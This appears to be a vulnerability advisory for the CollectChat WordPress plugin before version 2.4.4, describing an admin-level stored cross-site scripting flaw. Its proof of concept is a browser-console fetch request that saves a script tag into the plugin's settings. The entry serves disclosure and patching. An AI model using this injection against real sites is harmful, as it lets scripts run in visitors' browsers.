## WordPress Plugin Vulnerabilities

# CollectChat < 2.4.4 - Admin+ XSS

### Description

The plugin does not sanitise and escape some of its settings, which could allow high privilege users such as admin to perform Cross-Site Scripting attacks even when unfiltered\_html is disallowed

### Proof of Concept

1. Visit /wp-admin/admin.php?page=collectchat
2. Paste the following in your browser's console:
```
await fetch("http://example.com/wp-admin/options.php", {
"credentials": "include",
"headers": {
"Content-Type": "application/x-www-form-urlencoded",
},
"body": `option\_page=collectchat-settings-group&action=update&\_wpnonce=${document.getElementById('\_wpnonce').value}&\_wp\_http\_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Dcollectchat%26settings-updated%3Dtrue&collectchat-plugin-settings%5Bscript%5D=%3Cscript%3Ealert%282%29%3B%3C%2Fscript%3E&collectchat-plugin-settings%5BshowOn%5D=all&Submit=Save`,
"method": "POST",
"mode": "cors"
});
```
